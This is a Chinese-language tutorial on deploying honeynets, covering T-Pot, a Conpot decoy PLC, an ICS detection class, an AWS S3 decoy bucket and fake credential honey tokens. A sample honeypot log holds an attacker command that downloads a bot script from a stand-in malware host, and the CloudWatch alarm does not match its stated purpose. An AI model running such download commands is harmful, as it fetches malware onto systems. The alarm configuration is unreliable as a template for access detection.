# 蜜罐网络部署实战

## 概述

蜜罐网络 (Honeynet) 是多个蜜罐组成的完整攻击模拟环境——让攻击者以为找到了真实的生产网络，实际上每一步都在可观测的陷阱中。本章从单蜜罐迈向分布式蜜网部署。

---

## 1. T-Pot 多蜜罐平台

### 1.1 T-Pot 架构

```yaml
T-Pot (Telekom Security T-Pot):
  集成的蜜罐:
    - Cowrie: SSH/Telnet 蜜罐
    - Dionaea: SMB/HTTP/FTP/MSSQL 蜜罐
    - Conpot: ICS/SCADA 蜜罐
    - Honeytrap: 动态蜜罐 (监听任意端口)
    - ElasticPot: Elasticsearch 蜜罐
    - RDPY: RDP 蜜罐
    - Mailoney: SMTP 蜜罐
    - Cisco ASA: 网络设备蜜罐
    - Medpot: HL7 (医疗) 蜜罐
    - Sentinel: SIP (VoIP) 蜜罐

  分析平台:
    - Elastic Stack (ELK): 日志聚合
    - Kibana: 可视化仪表盘
    - Suricata: IDS
    - Cockpit: Docker 管理
    - SpiderFoot: OSINT 自动化

  部署方式:
    - ISO 安装 (裸金属/虚拟机)
    - Docker Compose (快速预览)
    - Ansible Playbook (大规模部署)
```

### 1.2 快速部署

```bash
# T-Pot 快速部署 (Ubuntu 22.04+)

# 1. 克隆仓库
git clone https://github.com/telekom-security/tpotce.git /opt/tpot

# 2. 安装
cd /opt/tpot/iso/installer/
./install.sh --type=user

# 3. 选择蜜罐类型
# [*] Cowrie (SSH)
# [*] Dionaea (SMB/FTP/HTTP)
# [*] Conpot (ICS/SCADA)
# [*] TANNER (Web App)
# [*] RDPY (RDP)
# [*] Adbhoney (ADB - 暴露的 Android 设备)

# 4. 配置 Web 界面
cat > /opt/tpot/etc/tpot.yml << EOF
web:
  user: admin
  pass: $(openssl rand -base64 32)
EOF

# 5. 启动
systemctl start tpot

# 6. 访问
# https://<IP>:64297  → Kibana
# https://<IP>:64294  → CyberChef
# https://<IP>:64295  → T-Pot Landing Page
```

### 1.3 攻击数据分析

```yaml
T-Pot 仪表盘指标:

  实时攻击地图:
    - 攻击源 IP → 国家/地区
    - 攻击端口分布
    - 攻击频率趋势

  Cowrie 日志示例:
    {
      "eventid": "cowrie.session.connect",
      "timestamp": "2024-03-15T14:32:05.123Z",
      "src_ip": "185.220.101.XX",
      "src_port": 54321,
      "dst_port": 2222,
      "session": "abc12345",
      "credentials": {
        "username": ["root", "admin", "ubuntu"],
        "password": ["password", "123456", "admin123"]
      },
      "commands": [
        "uname -a",
        "cat /proc/cpuinfo",
        "wget http://malware.com/bot.sh"
      ]
    }

  攻击者画像:
    - 初次连接 → 尝试默认凭证
    - 成功登录 → 环境探测 (uname/whoami/ls)
    - 下载恶意软件 → wget/curl
    - 横向移动 → ssh/扫描内网

  平均攻击开始时间:
    - 互联网: < 5 minutes
    - 云 (AWS/Azure): < 10 minutes
```

---

## 2. 工业控制系统蜜罐 (Conpot)

### 2.1 模拟西门子 S7 PLC

```xml
<!-- Conpot 配置 - 模拟 Siemens S7-300 PLC -->

<core>
    <template_path>/usr/local/lib/python3.9/dist-packages/conpot/templates</template_path>
    <template_name>default</template_name>
</core>

<modbus enabled="True">
    <device_info>
        <VendorName>Siemens</VendorName>
        <ProductCode>S7-300</ProductCode>
        <MajorMinorRevision>V3.0</MajorMinorRevision>
        <VendorUrl>www.siemens.com</VendorUrl>
        <ProductName>SIMATIC S7-300</ProductName>
        <ModelName>CPU 315-2 PN/DP</ModelName>
        <UserApplicationName>Water Treatment Plant System</UserApplicationName>
    </device_info>
</modbus>

<s7comm enabled="True">
    <device_info>
        <ModuleTypeName>IM151-8 PN/DP CPU</ModuleTypeName>
        <SerialNumber>S C-C2UR28922018</SerialNumber>
        <Copyright>Original Siemens Equipment</Copyright>
        <ModuleName>Production Line 3 - PLC</ModuleName>
        <OrderNumber>6ES7 315-2EH14-0AB0</OrderNumber>
        <PlantIdentification>WATER_TREATMENT_FACILITY</PlantIdentification>
    </device_info>
</s7comm>

<!-- 触发告警的数据 -->
<alerts>
    <s7comm>
        <item name="TEMP_WARNING">
            <value>85.5</value>  <!-- 模拟异常高温 → 诱使攻击者操作 -->
        </item>
        <item name="PRESSURE_VALVE">
            <value>OPEN</value>   <!-- 模拟阀门打开 -->
        </item>
    </s7comm>
</alerts>
```

### 2.2 ICS 攻击检测

```python
class ICSCanaryDetector:
    """ICS 蜜罐攻击检测"""

    def __init__(self):
        self.ics_protocols = {
            'modbus':   502,    # Modbus TCP
            's7comm':   102,    # Siemens S7
            'bacnet':   47808,  # BACnet
            'dnp3':     20000,  # DNP3
            'iec104':   2404,   # IEC 60870-5-104
            'ethernet_ip': 44818,  # EtherNet/IP
        }

    def detect_ics_reconnaissance(self, conn):
        """检测 ICS 侦察行为"""

        dst_port = conn.get('dst_port')

        if dst_port in self.ics_protocols.values():
            # 工业协议连接 → 可能是 ICS 攻击者
            protocol = [
                k for k, v in self.ics_protocols.items()
                if v == dst_port
            ][0]

            return {
                'alert': 'ICS_RECONNAISSANCE',
                'severity': 'HIGH',
                'protocol': protocol,
                'attack_category': '可能的目标侦察',
                'mitre_technique': 'T0843 (ICS Discovery)',
                'response': '记录攻击者 TTPs，通知 CERT'
            }

    def detect_ics_command(self, conn):
        """检测 ICS 写命令 (更危险)"""
        if self._is_write_operation(conn.get('payload')):
            return {
                'alert': 'ICS_WRITE_COMMAND',
                'severity': 'CRITICAL',
                'attack_category': '可能的操作中断尝试',
                'mitre_technique': 'T0836 (Modify Parameter)',
                'response': '立即分析攻击者行为，准备应急响应'
            }
```

---

## 3. 云环境蜜罐

### 3.1 AWS 蜜罐

```yaml
# AWS 蜜罐部署 — S3 存储桶诱饵

Resources:
  CanaryS3Bucket:
    Type: AWS::S3::Bucket
    DependsOn: CanaryS3AccessLog
    Properties:
      BucketName: !Sub "company-backup-${AWS::AccountId}"
      # 模拟公司备份桶
      PublicAccessBlockConfiguration:
        BlockPublicAcls: false      # 故意放开 (诱饵)
        BlockPublicPolicy: false
      # 实际不包含敏感数据 — 但看起来像有

  CanaryS3AccessLog:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Sub "canary-access-log-${AWS::AccountId}"
      # 记录所有对蜜罐桶的访问

  CanaryCloudTrail:
    Type: AWS::CloudTrail::Trail
    Properties:
      TrailName: "canary-audit-trail"
      IsLogging: true
      S3BucketName: !Ref CanaryS3AccessLog
      # 监控所有蜜罐资源

  # CloudWatch 告警 — 任何 GetObject 访问
  CanarySNSTopic:
    Type: AWS::SNS::Topic
    Properties:
      TopicName: "canary-alert"

  CanaryAlarm:
    Type: AWS::CloudWatch::Alarm
    Properties:
      AlarmName: "CanaryS3AccessDetected"
      MetricName: "NumberOfObjects"
      Namespace: "AWS/S3"
      Statistic: "Sum"
      Period: 60
      EvaluationPeriods: 1
      Threshold: 0
      ComparisonOperator: "GreaterThanThreshold"
      AlarmActions:
        - !Ref CanarySNSTopic
```

### 3.2 蜜标 (Honey Token)

```python
# AWS 蜜标 — Canary Token 部署

class AWSHoneyTokenDeployer:
    """AWS 蜜标部署"""

    def deploy_aws_credentials(self):
        """
        创建假 AWS 凭证
        部署到开发环境的 ~/.aws/credentials
        """
        return {
            'canary_type': 'aws_keys',
            'access_key': 'AKIA' + self._random(16),
            'secret_key': self._random(40),
            'region': 'us-east-1',
            'deploy_to': [
                '/home/dev1/.aws/credentials',
                '/home/dev2/.aws/credentials',
                'CI/CD 环境变量 (AWS_ACCESS_KEY_ID)',
                'Dockerfile: ENV AWS_ACCESS_KEY_ID=...',
            ],
            'alert': '任何 API 调用 → 即时告警'
        }

    def deploy_github_token(self):
        """
        GitHub Personal Access Token 蜜标
        提交到内部仓库
        """
        canary_token = f'ghp_{self._random(36)}'

        return {
            'canary_type': 'github_token',
            'token': canary_token,
            'deploy_to': [
                '.env 文件',
                '.github/workflows/deploy.yml',
                'config/default.json',
                '旧 commit 历史 (git filter-branch 注入)'
            ],
            'permissions': 'repo, workflow',  # 看起来有用
            'alert': '任何 API 调用 → 即时告警'
        }

    def deploy_slack_webhook(self):
        """
        Slack Webhook URL 蜜标
        嵌入到内部文档
        """
        return {
            'canary_type': 'slack_webhook',
            'url': f'https://hooks.slack.com/services/T{self._random(9)}/B{self._random(9)}/{self._random(24)}',
            'deploy_to': [
                '内部 Wiki',
                '内部 README',
                'Slack 频道描述',
                'Jenkins pipeline 配置',
            ]
        }
```

---

## 参考资源

- [T-Pot 多蜜罐平台](https://github.com/telekom-security/tpotce)
- [Conpot ICS 蜜罐](https://github.com/mushorg/conpot)
- [Canarytokens](https://canarytokens.org/)

---

*上一篇：[欺骗防御技术](./01-deception-technology.md)*
*下一篇：[蜜罐数据分析](./03-honeypot-analysis.md)*
